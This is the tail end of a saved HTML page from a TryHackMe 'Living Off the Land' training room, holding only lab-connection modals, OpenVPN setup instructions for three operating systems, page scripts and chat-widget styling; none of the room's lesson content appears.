</div>
<div class="modal-body text-center">
<p class="size-18 faded">Now you've started your machine, to access it you need to either</p>
<div class="row mb-0">
<div class="col-sm-6">
<img src="./TryHackMe _ Living Off the Land_files/connect_openvpn_short.png">
<p class="mt-2 mb-0 faded">Download your VPN configuration file and import it into a OpenVPN client</p>
</div>
<div class="col-sm-6">
<img src="./TryHackMe _ Living Off the Land_files/connect_kali_short.png">
<p class="mt-2 mb-0 faded">Control a web-based machine with everything you need, all from inside your browser</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title" id="roomAlertModalTitle"></h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body" id="roomAlertModalBody"></div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="resetUserProgressModal" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">Reset Your Progress</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<div><span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-danger" onclick="resetProgress()">Yes, please!</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header  modal-dark-blue">
<h5 class="modal-title">Cloud Information</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<ul class="nav nav-tabs">
<li class="nav-item pr-2">
<a class="nav-link active" data-toggle="tab" href="https://tryhackme.com/room/livingofftheland#env-tab">Environment</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/livingofftheland#creds-tab">Credentials</a>
</li>
</ul>
<div class="tab-content">
<div class="tab-pane active" id="env-tab"></div>
<div class="tab-pane" id="creds-tab"></div>
</div>
</div>
<div class="modal-footer" id="cloudEnvModalFooter">
</div>
</div>
</div>
</div>
<div class="modal fade" id="setNameModal" role="dialog">
<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title">Generating Your Certificate</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body container">
<div class="row">
<div class="col-6">
<h5 class="bold">Hey there, what's your name?</h5>
<p class="text-secondary">
If you want your name to appear on your certificate, please fill the field below.
</p>
<div class="form-group">
<label>Full Name </label>
<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control">
<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in">
</div>
</div>
<div class="col-6">
<h5 class="bold">You're here incognito? It's ok!</h5>
<p class="text-secondary">If you chose skip, your username will be used instead!</p>
</div>
</div>
<div class="row">
<div class="col-6">
<button type="button" class="btn btn-success float-right" id="modal-cert-generate" onclick="gen_cert(true)" disabled="">
Generate with my full name
</button>
</div>
<div class="col-6">
<button type="button" class="btn btn-primary float-right" id="modal-cert-skip" onclick="gen_cert(false)">
Generate with my username
</button>
</div>
</div>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Living Off the Land_files/certificateName.js"></script>
<div class="modal fade slideout-faq" id="roomSlideoutUnstuck" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-links">
<div id="unstuck-video" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-play"></i></div>
<div class="unstuck-icon-text">Video Solution</div>
</div>
<div id="unstuck-writeups" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-pen-alt"></i></div>
<div class="unstuck-icon-text">Writeups</div>
</div>
<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group" href="https://tryhackme.com/forum/thread/62558babd30b4c0048343483">
<div class="unstuck-icon"><i class="fas fa-comments-alt"></i></div>
<div class="unstuck-icon-text">Forum Post</div>
</a>
<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-books"></i></div>
<div class="unstuck-icon-text">Knowledge Base</div>
</a>
<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-users"></i></div>
<div class="unstuck-icon-text">Ask Community</div>
</a>
</div>
</div>
</div>
</div>
</div>
<style>

    #navConnModal .modal-body{
        position: relative;
    }

    #nav-openvpn,
    #nav-attackbox {
        display: none;
    }

    #nav-openvpn .nav-pills .nav-link.active,
    #nav-openvpn .nav-pills .show>.nav-link {
        background-color: #ec8e3d;
        color: white;
    }
    #nav-openvpn .nav-link {
        color: #909090;
    }
    #nav-openvpn a,
    #nav-attackbox a {
        color: #ec8e3d;
    }

    #nav-openvpn code.dark {
        background-color: #7d400a;
        color: #fff;
    }

    #slideout-bk {
        display: none;
        padding: 10px 15px;
        opacity: 0.8;
        cursor: pointer;
    }

    #slideout-bk:hover {
        opacity: 1;
    }

    #slideout-conn-hideip {
        display: none;
        position: absolute;
        bottom: 8px;
        right: 8px;
        opacity: 0.7;
        cursor: pointer;
    }

    #slideout-conn-hideip:hover {
        opacity: 1;
    }

</style>
<div class="modal fade slideout-faq" id="navConnModal" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-bk" class="noselect" onclick="showSlideoutConnOptions()"><i class="far fa-arrow-left mr-2"></i> Show Connection Options</div>
<div id="slideout-conn-options">
<div id="slideout-conn-header" class="text-center">
<img class="slideout-connect-img" src="./TryHackMe _ Living Off the Land_files/tryhackme_connect.png">
<div id="slideout-conn-status" class="size-22">You are <span class="text-danger">disconnected</span></div>
</div>
<div class="m-3 text-center">
<p>To access target machines you need to either:</p>
<div class="row mb-3 faq-quicklinks text-left vertical-align-custom">
<div class="col-md-12 mb-3">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/livingofftheland#" onclick="showAttackBoxSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-laptop"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">AttackBox</div>
<p class="faded mb-0">Use a browser-based attack machine</p>
</div>
</div>
</div>
</a>
</div>
<div class="col-md-12">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/livingofftheland#" onclick="showVPNSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-key"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">OpenVPN</div>
<p class="faded mb-0">Connect to our network via a VPN</p>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
</div>
<div id="faqCards" class="p-3">
<div id="nav-openvpn">
<div class="mb-3">
<a target="_blank" href="https://tryhackme.com/access"><i>View the dedicated OpenVPN access page for more information</i></a>
</div>
<div class="text-center">
<h4>What Operating System are you using?</h4>
<ul class="nav nav-pills mb-3 text-center" id="vpn-guide" style="display: flex; justify-content: center;">
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/livingofftheland#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true"><i class="fab fa-windows mr-2"></i> Windows</a>
</li>
<li class="nav-item m-3">
<a class="nav-link active" data-toggle="pill" href="https://tryhackme.com/room/livingofftheland#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false"><i class="fab fa-linux mr-2"></i> Linux</a>
</li>
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/livingofftheland#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false"><i class="fab fa-apple mr-2"></i> MacOS</a>
</li>
</ul>
<div class="tab-content text-left">
<div class="tab-pane fade" id="pills-windows" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/">Download</a> the OpenVPN GUI application.</li>
<li class="mt-2">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
<li class="mt-2">Open and run the OpenVPN GUI application as Administrator.<br><img class="mt-2 mb-3" src="./TryHackMe _ Living Off the Land_files/win_ran_admin.png"></li>
<li class="mt-2">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b>Import File</b>. <br><img class="mt-2 mb-3" src="./TryHackMe _ Living Off the Land_files/win_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Now right click on the application again, select your file and click Connect <br><img class="mt-2 mb-3" src="./TryHackMe _ Living Off the Land_files/win_connect.png"></li>
</ol>
</div>
<div class="tab-pane fade show active" id="pills-linux" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2">Run the following command in your terminal: <code class="dark">sudo apt install openvpn</code></li>
<li class="mt-2">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
<li class="mt-2">Use your OpenVPN file with the following command: <code class="dark">sudo openvpn /path/to/file.ovpn</code></li>
</ol>
</div>
<div class="tab-pane fade" id="pills-macos" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg">Download</a> OpenVPN for MacOS.</li>
<li class="mt-2">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br><img width="250" class="mt-2 mb-3" src="./TryHackMe _ Living Off the Land_files/mac_installer.png"></li>
<li class="mt-2">Open and run the OpenVPN GUI application.</li>
<li class="mt-2">The application will start running and appear in your top bar. Right click on the application and click <b>Import File -&gt; Local file</b>.<br><img class="mt-2 mb-3" src="./TryHackMe _ Living Off the Land_files/mac_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Right click on the application again, select your file and click connect.<br><img class="mt-2 mb-3" src="./TryHackMe _ Living Off the Land_files/mac_connect.png"></li>
</ol>
</div>
</div>
<section class="text-left">
<a class="remove-underline" data-toggle="collapse" href="https://tryhackme.com/room/livingofftheland#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems">
<h5 class="mb-0 text-openvpn">Having Problems?</h5>
</a>
<div class="collapse" id="havingProblems">
<ul class="mt-2 mb-0">
<li>If you can access <a target="_blank" href="http://10.10.10.10/">10.10.10.10</a>, you're connected.</li>
<li>Downloading and getting a 404? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>Getting inline cert error? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
<li>Is the OpenVPN client running as root? <span class="size-14 faded">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
<li>Have you restarted your VM?</li>
<li>Is your OpenVPN up-to-date?</li>
<li>Only 1 OpenVPN connection is allowed. <span class="size-14 faded">(Run <code class="dark">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
<li>Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/">docs</a> out.</li>
</ul>
</div>
</section>
</div>
</div>
<div id="nav-attackbox">
<div class="text-center">
<h4>AttackBox</h4>
<p class="faded">Use your own web-based linux machine to access machines on TryHackMe</p>
</div>
<p>To start your AttackBox in the room, click the <a class="preventDefault" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/livingofftheland#">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
<p>Free users get 1 free AttackBox hour. <a class="hacker-green" href="https://tryhackme.com/why-subscribe">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
</div>
</div>
<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;">Hide IP</span>
</div>
</div>
</div>
</div>
<script>

    const navConnVPNEl = document.querySelector('#nav-openvpn')
    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
    const navConnOptions = document.querySelector('#slideout-conn-options')

    const navConnBkBtn = document.querySelector('#slideout-bk')

    function showVPNSteps() {
        navConnOptions.style.display = 'none'
        navConnVPNEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showAttackBoxSteps() {
        navConnOptions.style.display = 'none'
        navConnAttackBoxEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showSlideoutConnOptions() {
        navConnVPNEl.style.display = 'none'
        navConnAttackBoxEl.style.display = 'none'
        navConnBkBtn.style.display = 'none'
        navConnOptions.style.display = 'block'
    }

    function showAttackBoxBtnFromSlideout() {
        $('#navConnModal').modal('toggle')
        setTimeout(function() {
            showAttackBoxBtnIntro()
        }, 100)   
    }

  </script>
</div><iframe id="_hjSafeContext_30574826" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Living Off the Land_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe>
<script src="./TryHackMe _ Living Off the Land_files/notify.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/api-requests.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/events.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/underscore-min.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/apexcharts.min.js"></script> 
<script src="./TryHackMe _ Living Off the Land_files/chart.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/expire.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/sockets.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/faqSearch.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/certificate.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/utils.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/roomSpecific.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/confetti.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/videos.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/intro.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/prism.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/asciinema-player.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/magnific-popup.min.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/introjsLogic.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/logic.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/tasks.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/connection-status.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/glossary.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/room-mymachine.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/heartbeat.js" defer=""></script>
<script>

    let height
    $(window).scroll(function () { /* Function to make IP information sticky. */
      if (height == undefined || height < 30) {
        height = ($('#instance-info').offset().top)
      }
      let scroll = $(window).scrollTop()
      if (((scroll >= (height + 150))) && height > 30) {
        $("#instance-info").addClass('instance-sticky')
      } else if ((scroll <= (height))) {
        $("#instance-info").removeClass("instance-sticky")
      }
    })

    const csrfToken = "gmziF7tK-o7wOw_HwrumDVR9uwSHNQjsYs-A"
    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)

    const roomCode = "livingofftheland"
    const simpleRoom = true 
    const events = {"tickets":false}

    let userObj = { 
      subscribed: 1,
      splitScreen: true,
      path: "redteaming",
      tutorial: {
        rooms: true,
        attackbox: true,
        staticsite: true
      },
      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
    }

    const roomSettings = {
      remAttackBoxBtn : false
    };

    const heartbeatInterval = 30;

    const cloudEnabled = false 
    let cloudObj

    initRoom()
    checkVideoTab()
    if(!simpleRoom) showChart(roomCode)

    checkRoomAwards(roomCode)

    getRoomVotes()

    displayStreakFreezeAwardedFromMemory();
    
    window.addEventListener('load', function () {
      introjsInit(roomCode)
    })

  </script>


<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg><div id="A0B788B8-9FB9-E81B-DCF4-B94D655C77DB"></div><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./TryHackMe _ Living Off the Land_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><img src="./TryHackMe _ Living Off the Land_files/9e0f012f15b6fc981dde2f1f5198d728.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white"></path>
</svg>
</div></div><style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    0% {
      opacity: 0;
      transform: scale(0);
    }
    40% {
      opacity: 1;
    }
    100% {
      transform: scale(1);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    padding: 0 !important;
    margin: 0 !important;
    border: none;
    bottom: 20px;
    right: 20px;
    max-width: 48px;
    width: 48px;
    max-height: 48px;
    height: 48px;
    border-radius: 50%;
    background: #1C2538;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    box-sizing: content-box;
  }


  .intercom-lightweight-app-launcher:hover {
    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    transform: scale(1.1)
  }

  .intercom-lightweight-app-launcher:active {
    transform: scale(0.85);
    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
  }


  .intercom-lightweight-app-launcher:focus {
    outline: none;

    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 48px;
    height: 48px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 24px;
    height: 24px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 44px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 24px;
    max-width: 24px;

    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
    transform-origin: bottom right;
    
        width: 400px;
        height: calc(100% - 104px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 84px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
      

    border-radius: 16px;
  }

  .intercom-lightweight-app-messenger-header {
    height: 64px;
    border-bottom: none;
    background: #1c2538

    
  }

  .intercom-lightweight-app-messenger-footer{
    position:absolute;
    bottom:0;
    width: 100%;
    height: 80px;
    background: #fff;
    font-size: 14px;
    line-height: 21px;
    border-top: 1px solid rgba(0, 0, 0, 0.05);
    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
    
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div></body></html>